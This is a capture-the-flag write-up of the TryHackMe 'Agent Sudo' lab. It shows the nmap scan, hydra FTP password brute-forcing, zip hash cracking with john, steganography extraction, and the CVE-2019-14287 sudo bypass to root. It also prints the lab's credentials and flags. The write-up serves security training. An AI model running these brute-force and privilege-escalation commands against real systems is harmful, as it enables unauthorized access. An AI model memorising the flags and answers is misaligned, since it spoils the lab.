# TryHackMe: Agent Sudo (Write-up)

Target IP: `10.10.212.153`

## [Task 1] Author note

Deploy the machine; navigate to it the host in your browser to reveal the some text.

```txt
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

## [Task 2]

### 1# How many open ports are there? 

There are `3` ports shown in the nmap scan; SSH on 22, FTP on 21, and HTTP on 80.

#### Nmap scan
```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ nmap -A -p- 10.10.212.153
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 14:06 EDT
Nmap scan report for 10.10.212.153
Host is up (0.066s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.95 seconds
```

### 2# How can you direct yourself to the secret page

On navigating to the home page we can see that we need to change our `User-Agent` to a _codename_ (Agent __`X`__). 

### 3# What is the agent name?

After fuzzing the codename's (the suffix in Agent #), you'll eventually find that Agent __C__ returns another page. 

```
http://10.10.212.153/agent_C_attention.php
```

But firstly, the Agent's name is revealed as `Chris`.

And two other agents:

- Agent C
- Agent R
- Agent J

## [Task 3] Hash cracking and brute-force 

### 1# FTP

Credentials found to be `chris:crystal`.

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.212.153 -V -I 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-24 14:23:04
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.212.153:21/
...
[21][ftp] host: 10.10.212.153   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-24 14:24:05
```

### 2# Zip

Lets try find the zip first. It's probably on the FTP server.

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

There are 3 files there. 

The `To_agentJ.txt` file contains a hint towards there being hidden files.

```
kali@kali:~/Desktop/TryHackMe/agent-sudo$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picis somehow stored in the fake picture. It shouldn't be a problem 

From,
Agent C
```

There is a .zip file hidden in `cutie.png`; this can be extracted with `binwalk`. 

```shell
binwalk -e cutie.png
```

Following this, we can crack the zip file with the John the Ripper by doing the following.

```console
# Generating a zip hash to crack with john 

kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ sudo zip2john 8702.zip 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ sudo zip2john 8702.zip > zip.hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

kali@kali:~/Desktop/TryHackMe/agent-sudo$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

kali@kali:~/Desktop/TryHackMe/agent-sudo$ ls
cute-alien.jpg  cutie.png             To_agentJ.txt
cutie.hash      _cutie.png.extracted  To_agentR.txt
kali@kali:~/Desktop/TryHackMe/agent-sudo$ cd _cutie.png.extracted/
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt

```

```shell
# Cracking with john
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ sudo john --format=zip -w /usr/share/wordlists/rockyou.txt zip.hash
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2020-09-24 14:54) 16.66g/s 59100p/s 59100c/s 59100C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

### steg password

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ 7z x 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz (306C3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt  zip.hash
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```
kali@kali:~/Desktop/TryHackMe/agent-sudo/_cutie.png.extracted$ echo QXJlYTUx | base64 -d
Area51
```

### 4# What is the other agent's full name?

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
kali@kali:~/Desktop/TryHackMe/agent-sudo$ ls
cute-alien.jpg  cutie.hash  cutie.png  _cutie.png.extracted  message.txt  To_agentJ.txt  To_agentR.txt
kali@kali:~/Desktop/TryHackMe/agent-sudo$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### 5# What is the SSH password?

_Revealed in `message.txt` above_...
`hackerrules!`.

## [Task 4] Capture the user flag

### 1# What is the user flag?

SSH into box with `james:hackerrules!`

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ ssh james@target.thm
james@target.thm's password: 
Permission denied, please try again.
james@target.thm's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 24 19:04:00 UTC 2020

  System load:  0.08              Processes:           98
  Usage of /:   39.9% of 9.78GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.212.153
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

Upon accessing the server we find the user flag file.

```
james@agent-sudo:~$ ls -lah
total 80K
drwxr-xr-x 4 james james 4.0K Oct 29  2019 .
drwxr-xr-x 3 root  root  4.0K Oct 29  2019 ..
-rw-r--r-- 1 james james  42K Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root   566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james 3.7K Apr  4  2018 .bashrc
drwx------ 2 james james 4.0K Oct 29  2019 .cache
drwx------ 3 james james 4.0K Oct 29  2019 .gnupg
-rw-r--r-- 1 james james  807 Apr  4  2018 .profile
-rw-r--r-- 1 james james    0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james   33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
```

### 2# What is the incident of the photo called?

In the previous step we saw a file called `Alien_autospy.jpg`. Let's dig into this file.

```shell
kali@kali:~/Desktop/TryHackMe/agent-sudo$ scp james@target.thm:Alien_autospy.jpg Alien_autospy.jpg
james@target.thm's password: 
Alien_autospy.jpg                                                              100%   41KB 505.1KB/s   00:00    
```

I downloaded the file with `scp` then ran it through a [reverse image search](https://tineye.com/search/1853b9e1d9617742c1089eaea4dfb7c63e8df12c?sort=score&order=desc&page=1) to reveal the incident to be called `Roswell alien autopsy`.

## [Task 5] Privilege Escalation

### 1# CVE number for the escalation

After finding a potential exploit vector upon running `sudo -l`...

```shell
james@agent-sudo:/$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

I sought out the CVE code and found [CVE-2019-14287](https://www.exploit-db.com/exploits/47502).

### 2# What is the root flag?

```shell
james@agent-sudo:/$ sudo -u#-1 /bin/bash
root@agent-sudo:/# whoami
root
root@agent-sudo:/# cd /root
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

```

### 3# (Bonus) What is Agent R's name?

This is visible at the bottom on root.txt. `DesKel`.
